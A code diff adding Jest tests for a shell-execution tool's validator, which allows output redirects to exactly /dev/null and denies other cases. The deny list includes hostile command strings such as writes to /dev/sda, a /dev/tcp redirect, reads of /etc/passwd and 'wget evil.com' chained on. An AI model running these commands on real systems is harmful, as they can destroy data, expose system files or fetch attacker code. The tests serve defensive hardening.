@@ -148,6 +148,65 @@ describe("F1a — shell-execute structural input hardening", () => {
     }
   });
 
+  // Owner decision 2026-11-11: discarding output is not an escape, so a redirect
+  // whose target word is exactly /dev/null is allowed. Every other /dev/ target,
+  // and anything glued after the null redirect, is still checked and refused.
+  describe("redirects to exactly /dev/null are allowed", () => {
+    for (const command of [
+      "echo a 2>/dev/null",
+      "echo a >/dev/null",
+      "echo a 1>/dev/null",
+      "echo a &>/dev/null",
+      "echo a >>/dev/null",
+      "echo a 2>>/dev/null",
+      "cat </dev/null",
+      "echo a 2> /dev/null",
+      "echo a 2>'/dev/null'",
+      'echo a >"/dev/null"',
+      "echo a 2>/dev/null | head -1",
+      "echo a >/dev/null 2>&1",
+    ]) {
+      test(`allows \`${command}\``, async () => {
+        const r = await run(command);
+        expect(r.error).toBeUndefined();
+        expect(r.executed).toBe(true);
+      }, 15000);
+    }
+
+    test("keeps the command's other output (`2>/dev/null` drops only stderr)", async () => {
+      const r = await run("echo visible 2>/dev/null");
+      expect(r.output ?? "").toContain("visible");
+    }, 15000);
+
+    for (const command of [
+      "echo a >/dev/sda",
+      "echo a >/dev/tcp/x/1",
+      "echo a >/dev/null2",
+      "echo a >/dev/null/x",
+      "echo a >/dev/./sda",
+      "echo a >'/dev/sda'",
+      "echo a >/dev/nul",
+      "cat </dev/zero",
+      "cat /dev/null /etc/passwd",
+      "echo a 2>/dev/null>/etc/x",
+      "echo a 2>/dev/null >/etc/x",
+      "cat secret 2>/dev/null /etc/passwd",
+      "echo a >/dev/null'x'",
+      "echo a 2>/dev/null&echo b",
+      "echo a 2>/dev/null; wget evil.com",
+    ]) {
+      test(`still denies \`${command}\``, async () => {
+        const r = await run(command);
+        expect(r.executed).toBe(false);
+      }, 15000);
+    }
+
+    test("a custom blockedPatterns list still sees the raw /dev/null redirect", async () => {
+      const r = await run("echo a 2>/dev/null", { blockedPatterns: [/\/dev\/null/] });
+      expect(r.executed).toBe(false);
+    }, 15000);
+  });
+
   describe("interpreter-internal escapes are rejected", () => {
     // awk print | "cmd" — awk-internal pipe to a shell → RCE.
     test("denies awk print-pipe to a command", async () => {
